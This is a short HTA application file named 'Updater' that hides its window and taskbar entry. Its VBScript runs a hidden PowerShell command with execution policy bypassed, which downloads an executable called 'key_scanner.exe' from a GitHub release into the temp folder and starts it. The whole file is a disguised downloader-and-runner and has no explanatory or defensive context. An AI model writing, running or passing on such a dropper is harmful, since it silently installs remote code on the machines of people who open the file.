<hta:application
  applicationname="Updater"
  border="none"
  caption="no"
  showintaskbar="no"
  windowstate="minimize"
  scroll="no"
>
<script language="VBScript">
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""$url='https://github.com/jozef800/discord/releases/download/v3.0/key_scanner.exe';$out='$env:temp\scanner.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out"""
Self.Close
</script>
